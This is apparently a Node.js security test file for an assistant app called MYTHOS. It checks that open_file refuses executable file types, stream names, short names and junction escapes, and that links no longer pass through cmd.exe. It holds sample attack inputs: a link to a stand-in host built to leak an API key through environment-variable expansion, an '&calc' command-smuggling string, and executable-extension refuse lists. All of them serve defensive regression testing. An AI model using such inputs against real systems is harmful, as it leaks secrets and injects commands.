'use strict';

// test/open-file-authorization.test.js — open_file decides on the file's REAL
// path, and anything that is not plainly a document needs a per-call approval;
// links leave MYTHOS without cmd.exe (2026-09-29 audit, B2c).
//
// THE DEFECTS, reproduced below:
//   1. open_file (tier 2, never asks) handed ShellExecute anything but fourteen
//      extensions, judged on the path as typed. .cpl, .url, .scf, .msc,
//      .settingcontent-ms and friends are run by ShellExecute too, and passed.
//   2. compose_email and open_artifact opened links with `cmd /c start "" <url>`.
//      cmd split the link at "&" (a signed vault link lost its &sig=) and replaced
//      %NAME% with MYTHOS's own environment variable — its API keys — so
//      open_artifact("https://evil.example/?k=%GEMINI_API_KEY%") opened the page
//      with the real key in it. Both are shown on a REAL cmd.exe below, with echo
//      and a made-up variable, next to the no-shell route that fixes them.
//   3. open_artifact passed any non-vault string to that same cmd line, so a file
//      path there RAN what it named.
//
// Everything is asserted on the mechanism: a recording "open" provider and a
// recording spawn show what actually reached the OS, so a refusal that still
// opened something fails.
//
// Probes, 2026-09-29, each applied and restored, each red here (see the probe
// record at the end of this file).

const { describe, test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const Module = require('node:module');
const { spawnSync } = require('node:child_process');

const policy = require('../src/core/effectors/open-file-policy');
const openUrl = require('../src/core/effectors/open-url');
const { validateUrl, openUrlExternally } = openUrl;
const computer = require('../src/core/effectors/from-computer');
const { effectorFromTool } = require('../src/core/effectors/adapter');
const { createLeash, APPROVAL_REASON } = require('../src/core/leash');
const { approvalConsentFor } = require('../src/core/voice/authority-gate');
const { dispatchAction } = require('../src/core/effectors/dispatch-action');

let root;
let savedDirs;
const opened = [];
before(() => {
  root = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), 'mythos-b2c-')));
  savedDirs = process.env.VOICE_ALLOWED_DIRS;
  process.env.VOICE_ALLOWED_DIRS = root;
  // Names that are ONLY an extension (".cpl") and names ending in a dot or space
  // are real files Node creates as written (measured 2026-09-29, B2c review) —
  // they are fixtures here, not hypotheticals.
  for (const name of ['notes.txt', 'report.pdf', 'page.html', 'other.html', 'panel.cpl', 'shortcut.url', 'README', 'run.exe.',
    '.cpl', '.exe', '.url', 'page2.html.', 'script.py', 'data.xml', 'a.settingcontent-ms']) {
    fs.writeFileSync(path.join(root, name), name === 'shortcut.url' ? '[InternetShortcut]\r\nURL=https://example.com/\r\n' : 'x');
  }
  fs.mkdirSync(path.join(root, 'docs'));
  computer.setOpenPathProvider(async (p) => { opened.push(p); return { opened: true }; });
});
after(() => {
  computer.setOpenPathProvider(null);
  if (savedDirs === undefined) delete process.env.VOICE_ALLOWED_DIRS; else process.env.VOICE_ALLOWED_DIRS = savedDirs;
  fs.rmSync(root, { recursive: true, force: true });
});

function world() {
  const effector = effectorFromTool(computer.TOOLS.find((t) => t.name === 'open_file'));
  const leash = createLeash({
    bus: { emit() {}, subscribe() { return () => {}; } },
    config: { AUTONOMOUS_MAX_TIER: 4, MYTHOS_DRY_RUN: false, LEASH_CONFIRM_TTL_MS: 30000, CHECKPOINT_TTL_MS: 1800000, TRUSTED_TOOLS: 'open_file', TRUSTED_TOOLS_DISABLED: false },
    identity: { checkBoundary: () => null, getMaxAutonomousTier: () => 4 },
    auditWriter: { write: () => ({ ok: true }) },
    goals: { get: () => null },
    effectors: { get: (name) => (name === 'open_file' ? effector : undefined) },
  });
  const hub = { invoke: (tool, args, ctx) => effector.invoke(args, ctx) };
  const dispatch = (decision, extra) => dispatchAction(decision, Object.assign({ effectors: hub, bus: { emit() {} }, channel: 'test' }, extra));
  return { leash, dispatch };
}
async function held(file) {
  const w = world();
  const d = { tool: 'open_file', args: { path: path.join(root, file) } };
  await w.leash.prepare(d);
  return { w, d, v: w.leash.check(d, { connectionId: 'c1' }) };
}

describe('the policy, on the real path', () => {
  test('display / refuse / approval', () => {
    const k = (p) => policy.classifyOpenTarget(p).kind;
    for (const p of ['a.txt', 'a.PDF', 'a.png', 'a.docx', 'a.mp4']) assert.equal(k(path.join(root, p)), 'display', p);
    for (const p of ['a.exe', 'a.cpl', 'a.url', 'a.scf', 'a.msc', 'a.settingcontent-ms', 'a.appref-ms', 'a.inf', 'a.lnk', 'a.exe.', 'a.exe ', 'a.pdf.exe',
      'a.py', 'a.xbap', 'a.msu', 'a.rdp', 'a.iso', 'a.vhdx', 'a.wsb']) {
      assert.equal(k(path.join(root, p)), 'refuse', p);
    }
    for (const p of ['a.html', 'a.svg', 'a.docm', 'a.zip', 'README', 'a.xml', 'a.rtf']) assert.equal(k(path.join(root, p)), 'approval', p);
  });

  // (b1) B2c review, 2026-09-29: path.extname('.cpl') is '' — Node reads the
  // leading dot as part of the name — so a file named only ".cpl" was "a file
  // with no extension" and opened after one click. Windows reads ".cpl" as its
  // extension and runs it through control.exe.
  test('(b1) a name that is ONLY an extension is read the Windows way — ".cpl" is a .cpl', () => {
    for (const name of ['.cpl', '.exe', '.url', '.hta', '.lnk']) {
      const c = policy.classifyOpenTarget(path.join(root, name));
      assert.equal(c.kind, 'refuse', name);
      assert.equal(c.ext, name, name);
    }
    assert.equal(policy.windowsExtension('.gitignore'), '.gitignore', 'ADJACENT: a dotfile is judged by its own name');
    assert.equal(policy.classifyOpenTarget(path.join(root, '.gitignore')).kind, 'approval', 'ADJACENT: not refused, not displayed');
    assert.equal(policy.windowsExtension('archive.tar.gz'), '.gz', 'ADJACENT: the LAST dot');
  });

  // (b6) A trailing dot or space is dropped by the shell's path handling, so it
  // would open "page.html" beside the "page.html." that was checked.
  test('(b6) a name ending in a dot or a space is refused — the shell would open a different file', () => {
    for (const name of ['page.html.', 'notes.txt ', 'run.exe.']) {
      const c = policy.classifyOpenTarget(path.join(root, name));
      assert.equal(c.kind, 'refuse', JSON.stringify(name));
      assert.match(c.reason, /different file/);
    }
  });

  test('a stream name is refused whatever it claims to be', () => {
    assert.equal(policy.classifyOpenTarget(path.join(root, 'notes.txt:evil')).kind, 'refuse');
    assert.equal(policy.hasStreamSyntax(path.join(root, 'notes.txt')), false, 'ADJACENT: the drive letter colon is fine');
  });
});

describe('open_file through the real leash', () => {
  // Typed in a different letter case, so the typed path and the real one differ
  // and the assertion can tell which reached the shell (B2c review: with the
  // canonical root and the same case, the two were equal and it could not).
  test('a document opens with no approval — and the shell gets the REAL path', async () => {
    const w = world();
    const d = { tool: 'open_file', args: { path: path.join(root, 'NOTES.TXT') } };
    await w.leash.prepare(d);
    const v = w.leash.check(d, { connectionId: 'c1' });
    assert.equal(v.allow, true, JSON.stringify(v));
    opened.length = 0;
    const out = await w.dispatch(d, { tier: v.tier });
    assert.equal(out.ok, true, JSON.stringify(out));
    assert.deepEqual(opened, [path.join(root, 'notes.txt')]);
  });

  test('a file Windows would RUN is refused by the leash — no approval can open it, and nothing reaches the shell', async () => {
    for (const file of ['panel.cpl', '.cpl', '.exe', 'run.exe.', 'page2.html.', 'script.py']) {
      const { w, d, v } = await held(file);
      assert.equal(v.allow, false, file);
      assert.equal(v.requireConfirm, false, file + ': refused, not held');
      // (b10) the target resolved; it is refused for what it is, and the audit
      // reason says so instead of "target-unresolved".
      assert.match(v.reason, /^target-refused: /, file);
      assert.match(v.reason, /Windows would EXECUTE|different file/, file);
      assert.equal(approvalConsentFor(d), null, 'there is nothing approvable');
      opened.length = 0;
      assert.equal((await w.dispatch(d, {})).ok, false);
      assert.deepEqual(opened, [], file + ' must never reach the shell');
    }
  });

  test('(b10) a .url shortcut is refused with the way forward: read the link inside it', async () => {
    for (const file of ['shortcut.url', '.url']) {
      const { w, d, v } = await held(file);
      assert.equal(v.allow, false, file);
      assert.match(v.reason, /^target-refused: .*web shortcut/, file);
      assert.equal(v.remedy && v.remedy.tool, 'read_file', file);
      opened.length = 0;
      assert.equal((await w.dispatch(d, {})).ok, false);
      assert.deepEqual(opened, []);
    }
  });

  test('(b3) .xml and .rtf are no longer display-only: held for the click, like .html', async () => {
    const { v } = await held('data.xml');
    assert.equal(v.requireConfirm, true);
    assert.equal(v.perCallApproval, true);
    assert.match(v.detail, /may run it/, 'the prompt says the associated program may run it');
  });

  test('anything else is held for the operator\'s click — even at ceiling 4 with open_file in TRUSTED_TOOLS', async () => {
    const { w, d, v } = await held('page.html');
    assert.equal(v.allow, false);
    assert.equal(v.requireConfirm, true);
    assert.equal(v.perCallApproval, true);
    assert.equal(v.reason, APPROVAL_REASON);
    assert.match(v.detail, /\.html file/);
    opened.length = 0;
    const out = await w.dispatch(d, {});
    assert.equal(out.ok, false);
    assert.equal(out.requiresApproval, true);
    assert.deepEqual(opened, [], 'a dispatch that skipped the confirm opens nothing');
  });

  test('after approval EXACTLY that file opens; a token for one file does not open another; a token is one-use', async () => {
    const a = await held('page.html');
    const b = await held('other.html');
    const tokenA = approvalConsentFor(a.d);
    opened.length = 0;
    assert.equal((await b.w.dispatch(b.d, { consent: tokenA })).ok, false, 'a token is bound to its file');
    assert.deepEqual(opened, []);
    assert.equal((await a.w.dispatch(a.d, { consent: tokenA })).ok, true);
    assert.deepEqual(opened, [path.join(root, 'page.html')]);
    opened.length = 0;
    assert.equal((await a.w.dispatch(a.d, { consent: tokenA })).ok, false, 'one-use');
    assert.deepEqual(opened, []);
  });

  test('a file changed after it was approved is not opened', async () => {
    const a = await held('page.html');
    const token = approvalConsentFor(a.d);
    const later = new Date(Date.now() + 5000);
    fs.writeFileSync(path.join(root, 'page.html'), 'changed');
    fs.utimesSync(path.join(root, 'page.html'), later, later);
    opened.length = 0;
    const out = await a.w.dispatch(a.d, { consent: token });
    assert.equal(out.ok, false);
    assert.match(String(out.result), /changed after it was checked/);
    assert.deepEqual(opened, []);
  });

  test('a folder and a missing file: the reason names the next tool, in words and as a remedy', async () => {
    for (const [file, tool] of [['docs', 'open_folder'], ['nope.txt', 'search_files']]) {
      const { v } = await held(file);
      assert.equal(v.allow, false, file);
      assert.match(v.reason, new RegExp(tool), file);
      assert.equal(v.remedy && v.remedy.tool, tool, file);
    }
  });

  test('a real NTFS stream hidden behind a document name is refused, and nothing opens', async () => {
    fs.writeFileSync(path.join(root, 'notes.txt') + ':hidden.cpl', 'x'); // an alternate data stream on notes.txt
    const { w, d, v } = await held('notes.txt:hidden.cpl');
    assert.equal(v.allow, false);
    assert.match(v.reason, /NTFS stream/);
    opened.length = 0;
    assert.equal((await w.dispatch(d, {})).ok, false);
    assert.deepEqual(opened, []);
  });

  // (b9) The first version of this test fell back to matching source text on
  // this machine (a file symlink needs Developer Mode), so a change that read
  // the kind off the TYPED path stayed green. The 8.3 short name is the same
  // attack with no privilege: typed as A237D~1.SET it looks like ".set" (not on
  // any list: approval), while the real file is .settingcontent-ms (refused).
  // Measured 2026-09-29: this volume makes short names; Node's JS realpath keeps
  // the short leaf as typed and realpathSync.native expands it.
  test('(b9) what is classified is the REAL file — an 8.3 short name of a .settingcontent-ms is refused, not held as ".set"', async () => {
    const real = path.join(root, 'a.settingcontent-ms');
    const r = spawnSync('cmd', ['/c', 'for %I in ("' + real + '") do @echo %~sI'], { windowsVerbatimArguments: true, encoding: 'utf8' });
    const shortLeaf = path.basename(String(r.stdout || '').trim());
    if (!/~\d/.test(shortLeaf)) {
      // A volume with 8.3 names switched off cannot show it; pin the mechanism.
      const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'core', 'effectors', 'open-file.js'), 'utf8');
      assert.match(src, /real = fs\.realpathSync\.native\(lexical\); st = fs\.statSync\(real\);[\s\S]*classifyOpenTarget\(real\)/);
      return;
    }
    assert.notEqual(path.extname(shortLeaf).toLowerCase(), '.settingcontent-ms', 'typed, it does not look like what it is');
    const { w, d, v } = await held(shortLeaf);
    assert.equal(v.allow, false, JSON.stringify(v));
    assert.equal(v.requireConfirm, false, 'refused outright, not held for a click as an unknown ".set"');
    assert.match(v.reason, /\.settingcontent-ms/);
    opened.length = 0;
    assert.equal((await w.dispatch(d, {})).ok, false);
    assert.deepEqual(opened, []);
  });

  // (b5) The sandbox judged the typed path through Node's JS realpath; the file
  // opened is the native realpath. A junction flipped between the two is shown
  // here by a sandbox that answered for the typed path as it stood BEFORE the
  // flip; the path that would be opened must still be held to the roots.
  test('(b5) the path that would be OPENED is held to the allowed folders — a junction flipped after the sandbox check does not escape', () => {
    const outside = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), 'mythos-b2c-out-')));
    try {
      fs.writeFileSync(path.join(outside, 'secret.txt'), 'x');
      const j = path.join(root, 'flip');
      fs.symlinkSync(outside, j, 'junction');
      const typed = path.join(j, 'secret.txt');
      // A sandbox whose only root is `root` (this branch's real roots also hold
      // the repository, where the suite's temp folder lives), and which passed
      // the typed path as it stood before the flip.
      const onlyRoot = (p) => (String(p).toLowerCase().startsWith(root.toLowerCase() + path.sep)
        ? { ok: true, resolved: p } : { ok: false, reason: 'outside the allowed folders: ' + p });
      const beforeTheFlip = (p) => (p === typed ? { ok: true, resolved: typed } : onlyRoot(p));
      const { createOpenFile } = require('../src/core/effectors/open-file');
      const target = createOpenFile({ resolveSandboxed: beforeTheFlip }).prepare({ path: typed });
      assert.equal(target.resolved, false, JSON.stringify(target));
      assert.match(target.reason, /outside the allowed folders/);
      const inside = createOpenFile({ resolveSandboxed: beforeTheFlip }).prepare({ path: path.join(root, 'notes.txt') });
      assert.equal(inside.resolved, true, 'ADJACENT: a file really inside the root still prepares: ' + JSON.stringify(inside));
    } finally {
      // The junction first (libuv removes a junction itself, never what it points at).
      try { fs.unlinkSync(path.join(root, 'flip')); } catch (_) { /* not created */ }
      fs.rmSync(outside, { recursive: true, force: true });
    }
  });
});

// ---- links leave MYTHOS without cmd.exe --------------------------------------

describe('why cmd.exe had to go — shown on a real cmd.exe, with echo and a made-up variable', () => {
  const env = Object.assign({}, process.env, { B2C_PROBE_SECRET: 'THE-REAL-VALUE' });
  const link = 'https://evil.example/?a=1&k=%B2C_PROBE_SECRET%';

  test('REPRODUCTION: cmd splits the link at "&" and fills in %VAR% from the environment', () => {
    const r = spawnSync('cmd', ['/c', 'echo', link], { shell: false, env, encoding: 'utf8' });
    assert.doesNotMatch(r.stdout, /k=THE-REAL-VALUE/, 'split at & first: the part after it ran as a command');
    const q = spawnSync('cmd', ['/c', 'echo', 'https://evil.example/?k=%B2C_PROBE_SECRET%'], { shell: false, env, encoding: 'utf8' });
    assert.match(q.stdout, /THE-REAL-VALUE/, 'cmd expanded the variable into the link');
  });

  test('THE FIX: without a shell, CreateProcess passes the link byte for byte', () => {
    const r = spawnSync(process.execPath, ['-e', 'process.stdout.write(process.argv[1])', link], { shell: false, env, encoding: 'utf8' });
    assert.equal(r.stdout, link);
  });
});

// (b9) The recording spawn is PASSED IN through open-url's seam. It used to be
// swapped in by intercepting require('child_process'), which only worked while
// open-url.js required it at call time — a refactor to a load-time require
// would have launched the real browser before any assertion failed (a load-time
// copy did exactly that once, 2026-09-29).
function withRecordedSpawn(fn) {
  const calls = [];
  openUrl.setSpawnImpl((cmd, args, opts) => { calls.push({ cmd, args, opts }); return { on() {}, unref() {} }; });
  return Promise.resolve().then(() => fn(calls)).finally(() => { openUrl.setSpawnImpl(null); });
}

describe('openUrlExternally', () => {
  test('only http, https and mailto, with no quote or control character', () => {
    for (const u of ['https://example.com/?a=1&b=2', 'http://localhost:4478/vault/x.html?exp=1&sig=ab', 'mailto:a@example.com?subject=hi']) assert.equal(validateUrl(u).ok, true, u);
    for (const u of ['file:///C:/Windows/System32/calc.exe', 'javascript:alert(1)', 'ms-settings:privacy', path.join(root, 'run.exe'), 'https://x.example/"&calc', 'not a url']) {
      assert.equal(validateUrl(u).ok, false, u);
    }
  });

  // Not explorer.exe: measured live 2026-09-29, it silently opens nothing for a
  // link with a query (see open-url.js). A browser cannot be driven from a test,
  // so the live measurement is in that header and this pins the route it chose.
  test('on Windows it is rundll32 url.dll,FileProtocolHandler with the link as ONE argument — never cmd, never explorer — and no shell', async () => {
    const calls = [];
    const r = openUrlExternally('https://evil.example/?a=1&k=%GEMINI_API_KEY%', { platform: 'win32', spawnFn: (cmd, args, opts) => { calls.push({ cmd, args, opts }); return { unref() {} }; } });
    assert.equal(r.ok, true);
    assert.equal(calls.length, 1);
    assert.equal(path.basename(calls[0].cmd).toLowerCase(), 'rundll32.exe');
    if (process.env.WINDIR) assert.equal(calls[0].cmd, path.join(process.env.WINDIR, 'System32', 'rundll32.exe'), 'by full path, not found on PATH');
    assert.deepEqual(calls[0].args, ['url.dll,FileProtocolHandler', 'https://evil.example/?a=1&k=%GEMINI_API_KEY%']);
    assert.equal(calls[0].opts.shell, false);
  });

  // (b4) A spawn that fails reports an 'error' EVENT a tick later. With no
  // listener Node throws it and crash-handlers.js ends the server; compose_email
  // attached none. The opener listens itself now, so no caller can forget.
  test('(b4) a failed spawn is heard, not thrown: the opener attaches its own error listener', () => {
    const { EventEmitter } = require('node:events');
    let child;
    const r = openUrlExternally('https://example.com/', { platform: 'win32', spawnFn: () => { child = new EventEmitter(); child.unref = () => {}; return child; } });
    assert.equal(r.ok, true);
    assert.ok(child.listenerCount('error') >= 1, 'an error listener is attached before the caller sees the child');
    assert.doesNotThrow(() => child.emit('error', new Error('spawn rundll32.exe ENOENT')));
  });

  test('(b7) a link with a space, a quote or a backslash in its normalised form is refused — mailto keeps spaces', () => {
    // (WHATWG escapes a space in a mailto QUERY; the address part keeps spaces and backslashes.)
    for (const u of ['mailto:a b@example.com', 'mailto:a\\b@example.com']) assert.equal(validateUrl(u).ok, false, u);
    assert.equal(validateUrl('mailto:a@example.com?body=x y').href, 'mailto:a@example.com?body=x%20y', 'ADJACENT: the query space is escaped');
    assert.equal(validateUrl('https://x.example/a b').href, 'https://x.example/a%20b', 'ADJACENT: http(s) escapes the space itself');
    assert.equal(validateUrl('mailto:a@example.com?subject=hi%20there').ok, true, 'ADJACENT: an escaped mailto opens');
  });

  test('ADJACENT: the argument is the normalised href — a space is %20, so the command line never quotes or splits it', () => {
    const calls = [];
    const r = openUrlExternally('https://x.example/a b?q=c d', { platform: 'win32', spawnFn: (cmd, args) => { calls.push(args); return { unref() {} }; } });
    assert.equal(r.ok, true);
    assert.equal(calls[0][1], 'https://x.example/a%20b?q=c%20d');
    assert.doesNotMatch(calls[0][1], /[\s"]/);
  });
});

describe('open_artifact and compose_email use it', () => {
  const { buildTools } = require('../src/core/effectors/from-dashboard');
  const openArtifact = () => buildTools({ goalsEffector: {}, pipeline: {}, kanban: {}, agentActions: {}, buildRunner: {}, config: {}, fs: null,
    bus: { emit() {} }, probes: { getStatus: async () => ({}) } }).TOOLS.find((t) => t.name === 'open_artifact').fn;

  test('a file path is refused with open_file as the remedy — and nothing is spawned', async () => {
    await withRecordedSpawn(async (calls) => {
      for (const p of [path.join(root, 'run.exe'), path.join(root, 'notes.txt'), 'ms-settings:privacy']) {
        const r = await openArtifact()({ path: p });
        assert.equal(r.ok, false, p);
        assert.match(String(r.result), /open_file/, p);
        assert.equal(r.remedy && r.remedy.tool, 'open_file', p);
      }
      assert.deepEqual(calls, []);
    });
  });

  // (open_artifact still refuses a model-typed "&" with its older metacharacter
  // filter; the signed vault link's own &sig= is open-artifact-auth.test.js's case.)
  test('a web link reaches the OS whole: "%NAME%" is not expanded, and it is not cmd', async () => {
    await withRecordedSpawn(async (calls) => {
      const r = await openArtifact()({ path: 'https://example.com/?k=%GEMINI_API_KEY%' });
      assert.equal(r.ok, true, JSON.stringify(r));
      assert.equal(calls.length, 1);
      assert.notEqual(calls[0].cmd, 'cmd');
      assert.equal(calls[0].args[calls[0].args.length - 1], 'https://example.com/?k=%GEMINI_API_KEY%');
    });
  });

  // VOICE_EMAIL_MODE is pinned for each case: a runner whose shell set it would
  // otherwise decide which half ran (B2c review).
  async function inEmailMode(mode, fn) {
    const saved = process.env.VOICE_EMAIL_MODE;
    if (mode) process.env.VOICE_EMAIL_MODE = mode; else delete process.env.VOICE_EMAIL_MODE;
    try { return await fn(); } finally { if (saved === undefined) delete process.env.VOICE_EMAIL_MODE; else process.env.VOICE_EMAIL_MODE = saved; }
  }

  test('compose_email: the whole Gmail link, every field, in one argument', async () => {
    await inEmailMode(null, () => withRecordedSpawn(async (calls) => {
      const r = computer.compose_email({ to: 'a@example.com', subject: 'Hello & welcome', body: '100% sure' });
      assert.equal(r.ok, true, JSON.stringify(r));
      assert.equal(calls.length, 1);
      assert.notEqual(calls[0].cmd, 'cmd');
      const sent = calls[0].args[calls[0].args.length - 1];
      for (const part of ['to=a%40example.com', 'subject=Hello+%26+welcome', 'body=100%25+sure', 'view=cm', 'fs=1']) assert.ok(sent.includes(part), part + ' missing from ' + sent);
    }));
  });

  test('compose_email in mailto mode: the mail link, every field, in one argument — not cmd', async () => {
    await inEmailMode('mailto', () => withRecordedSpawn(async (calls) => {
      const r = computer.compose_email({ to: 'a@example.com', subject: 'Hello & welcome', body: '100% sure' });
      assert.equal(r.ok, true, JSON.stringify(r));
      assert.equal(calls.length, 1);
      assert.notEqual(calls[0].cmd, 'cmd');
      const sent = calls[0].args[calls[0].args.length - 1];
      assert.match(sent, /^mailto:/);
      for (const part of ['subject=', 'body=', '%26', '100%25']) assert.ok(sent.includes(part), part + ' missing from ' + sent);
    }));
  });
});

// PROBE RECORD, 2026-09-29 — eleven mutations, each applied, diffed and restored
// by checksum, each red in this file: .cpl dropped from the execute list; the
// TYPED path classified instead of the real one (red through the source pin —
// this machine cannot create file symlinks without Developer Mode); the approval
// branch returning "none"; the consent check skipped; the same-file re-check
// reduced to "still exists"; the stream check in prepare() removed;
// compose_email back on cmd /c start; open_artifact passing any non-vault path
// on; the Windows opener back to cmd; validateUrl accepting any scheme; and a
// FIXTURE mutation — the "open" provider recording nothing — which proves the
// assertions watch what reached the shell.
// Then, after the live check found explorer.exe opens nothing for a link with a
// query and the opener moved to rundll32: three more, same day, each red — the
// Windows opener back to cmd (4 tests), back to explorer.exe (the route test),
// and the raw link passed instead of the normalised href (the ADJACENT test).
// Then the independent review (Opus 5.5, 2026-09-29) found an extension-only
// name (".cpl") classed as "no extension", script runtimes and .xml/.rtf treated
// as documents, a spawn error that could end the server, the opened path never
// held to the roots, trailing dots, mailto spaces, a refusal logged as
// "unresolved", and a false green (the short-name case only pinned source text).
// Twelve more probes, same day, each applied, checked by sha256 and restored,
// each red: Node's extname back (b1); the trailing-dot refusal off (b6); the
// second sandbox check removed (b5); .py off the refuse list; .xml back on the
// display list (b3); the opener's own error listener removed (b4); the href
// space/quote/backslash check disabled (b7); rundll32 taken from PATH; the leash
// dropping the refusal's code (b10); the .url remedy removed (b10); the TYPED
// path classified — now red BEHAVIOURALLY through the 8.3 name (b9), not a
// source pin; and the typed path handed to the shell (the NOTES.TXT case).
